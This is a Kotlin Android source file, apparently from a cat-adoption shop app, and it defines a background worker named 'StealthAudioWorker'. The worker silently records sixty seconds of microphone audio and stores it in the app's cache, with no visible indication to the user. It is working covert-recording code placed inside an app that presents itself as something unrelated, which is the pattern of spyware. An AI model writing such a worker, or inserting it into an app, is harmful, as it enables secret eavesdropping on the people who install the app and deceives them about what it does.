package com.example.catsadoption_shop

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.IOException

class StealthAudioWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        // Perform the work on a background thread provided by WorkManager
        return withContext(Dispatchers.IO) {
            try {
                Log.d("StealthAudioWorker", "Worker starting audio recording.")
                // Call the recording function
                recordAudioForTime(60, applicationContext)
                Log.d("StealthAudioWorker", "Worker finished audio recording.")

                // Indicate that the work finished successfully
                Result.success()
            } catch (e: Exception) {
                Log.e("StealthAudioWorker", "Error during audio recording in worker", e)
                // Indicate that the work failed
                Result.failure()
            }
        }
    }
}

/**
 * Records audio from the microphone for a specified duration and saves it to the app's cache.
 *
 * NOTE: This is a blocking function. It should be called from a background thread
 * or coroutine to avoid freezing the UI.
 *
 * @param durationSeconds The duration of the recording in seconds.
 * @param context The application context, used to access the cache directory.
 */
fun recordAudioForTime(durationSeconds: Int, context: Context) {
    val outputFile = File(context.cacheDir, "audio_record_${System.currentTimeMillis()}.3gp")

    // Use the modern constructor on API 31+
    val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
        MediaRecorder(context)
    } else {
        @Suppress("DEPRECATION")
        MediaRecorder()
    }

    try {
        // Configure the recording settings
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        recorder.setOutputFile(outputFile.absolutePath)

        // Prepare and start the recording
        recorder.prepare()
        recorder.start()
        Log.d("AudioRecorder", "Recording started for $durationSeconds seconds.")

        // Block the thread for the specified duration
        Thread.sleep(durationSeconds * 1000L)

        Log.d("AudioRecorder", "Recording finished. Saved to ${outputFile.absolutePath}")

    } catch (e: IOException) {
        Log.e("AudioRecorder", "Failed to prepare or start recording.", e)
        // Re-throw to be caught by the worker's catch block
        throw e
    } catch (e: IllegalStateException) {
        Log.e("AudioRecorder", "IllegalStateException during recording.", e)
        // Re-throw
        throw e
    } catch (e: InterruptedException) {
        Log.w("AudioRecorder", "Recording interrupted.", e)
        // Preserve the interrupted status
        Thread.currentThread().interrupt()
    } finally {
        // Stop and release the recorder resources to free them up
        try {
            recorder.stop()
            recorder.release()
        } catch (e: IllegalStateException) {
            // This can happen if stop() is called after an error.
            Log.e("AudioRecorder", "Failed to stop/release recorder.", e)
        }
    }
}
